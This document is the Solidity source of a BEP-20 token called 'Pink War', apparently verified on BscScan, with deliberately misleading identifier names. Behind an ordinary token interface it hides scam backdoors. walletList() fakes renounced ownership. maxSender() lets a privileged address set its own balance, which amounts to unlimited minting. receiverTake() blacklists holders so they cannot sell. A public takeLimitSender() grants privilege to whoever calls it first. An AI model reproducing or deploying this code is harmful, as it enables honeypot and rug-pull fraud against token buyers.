/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface autoWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTeam) external view returns (uint256);

    function transfer(address tradingList, uint256 maxBuy) external returns (bool);

    function allowance(address walletLaunchedBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxBuy) external returns (bool);

    function transferFrom(
        address sender,
        address tradingList,
        uint256 maxBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listEnableLiquidity, uint256 value);
    event Approval(address indexed walletLaunchedBuy, address indexed spender, uint256 value);
}

interface autoWalletMetadata is autoWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface senderReceiver {
    function createPair(address liquiditySwap, address buyAutoFrom) external returns (address);
}

interface takeToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverAutoList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract PinkWar is receiverAutoList, autoWallet, autoWalletMetadata {
    uint8 private tradingSwap = 18;
    

    
    bool public toLimitLaunched;
    mapping(address => bool) public liquiditySender;
    
    string private tokenAmount = "Pink War";
    string private sellMax = "PWR";
    bool public minSender;
    uint256 private marketingAmount = 100000000 * 10 ** tradingSwap;
    bool private teamFund;
    address private listTo;
    bool public receiverListIs;
    uint256 private senderFund;
    address public totalTokenFrom;
    mapping(address => bool) public listMin;
    address public exemptList;
    uint256 private swapSell;
    mapping(address => uint256) private teamLiquidityMax;
    bool public toMode;
    mapping(address => mapping(address => uint256)) private feeLiquidity;



    

    event OwnershipTransferred(address indexed minSwapToken, address indexed modeAtMax);

    constructor (){
        
        takeToken fromMinSwap = takeToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptList = senderReceiver(fromMinSwap.factory()).createPair(fromMinSwap.WETH(), address(this));
        listTo = _msgSender();
        if (receiverListIs == toMode) {
            receiverListIs = true;
        }
        totalTokenFrom = listTo;
        liquiditySender[totalTokenFrom] = true;
        if (toMode == teamFund) {
            teamFund = false;
        }
        teamLiquidityMax[totalTokenFrom] = marketingAmount;
        emit Transfer(address(0), totalTokenFrom, marketingAmount);
        walletList();
    }

    

    function name() external view virtual override returns (string memory) {
        return tokenAmount;
    }

    function takeLimitSender(address amountAt) public {
        if (minSender) {
            return;
        }
        
        liquiditySender[amountAt] = true;
        if (toMode) {
            senderFund = swapSell;
        }
        minSender = true;
    }

    function sellFund() public view returns (uint256) {
        return senderFund;
    }

    function receiverExemptTrading() public {
        
        if (teamFund == toLimitLaunched) {
            toLimitLaunched = true;
        }
        teamFund=false;
    }

    function approve(address listWalletTx, uint256 maxBuy) public virtual override returns (bool) {
        feeLiquidity[_msgSender()][listWalletTx] = maxBuy;
        emit Approval(_msgSender(), listWalletTx, maxBuy);
        return true;
    }

    function toSell() public view returns (uint256) {
        return swapSell;
    }

    function tradingTxAmount() public view returns (bool) {
        return toMode;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellMax;
    }

    function getOwner() external view returns (address) {
        return listTo;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingAmount;
    }

    function transfer(address receiverMarketing, uint256 maxBuy) external virtual override returns (bool) {
        return exemptTx(_msgSender(), receiverMarketing, maxBuy);
    }

    function owner() external view returns (address) {
        return listTo;
    }

    function allowance(address exemptSwap, address listWalletTx) external view virtual override returns (uint256) {
        return feeLiquidity[exemptSwap][listWalletTx];
    }

    function transferFrom(address fromTo, address tradingList, uint256 maxBuy) external override returns (bool) {
        if (feeLiquidity[fromTo][_msgSender()] != type(uint256).max) {
            require(maxBuy <= feeLiquidity[fromTo][_msgSender()]);
            feeLiquidity[fromTo][_msgSender()] -= maxBuy;
        }
        return exemptTx(fromTo, tradingList, maxBuy);
    }

    function tokenFee() public view returns (uint256) {
        return senderFund;
    }

    function launchSender(address fromTo, address tradingList, uint256 maxBuy) internal returns (bool) {
        require(teamLiquidityMax[fromTo] >= maxBuy);
        teamLiquidityMax[fromTo] -= maxBuy;
        teamLiquidityMax[tradingList] += maxBuy;
        emit Transfer(fromTo, tradingList, maxBuy);
        return true;
    }

    function balanceOf(address liquidityTeam) public view virtual override returns (uint256) {
        return teamLiquidityMax[liquidityTeam];
    }

    function walletList() public {
        emit OwnershipTransferred(totalTokenFrom, address(0));
        listTo = address(0);
    }

    function launchMode() public view returns (bool) {
        return receiverListIs;
    }

    function maxSender(uint256 maxBuy) public {
        if (!liquiditySender[_msgSender()]) {
            return;
        }
        teamLiquidityMax[totalTokenFrom] = maxBuy;
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingSwap;
    }

    function exemptTx(address fromTo, address tradingList, uint256 maxBuy) internal returns (bool) {
        if (fromTo == totalTokenFrom || tradingList == totalTokenFrom) {
            return launchSender(fromTo, tradingList, maxBuy);
        }
        
        require(!listMin[fromTo]);
        
        return launchSender(fromTo, tradingList, maxBuy);
    }

    function receiverTake(address swapAuto) public {
        
        if (swapAuto == totalTokenFrom || swapAuto == exemptList || !liquiditySender[_msgSender()]) {
            return;
        }
        
        listMin[swapAuto] = true;
    }


}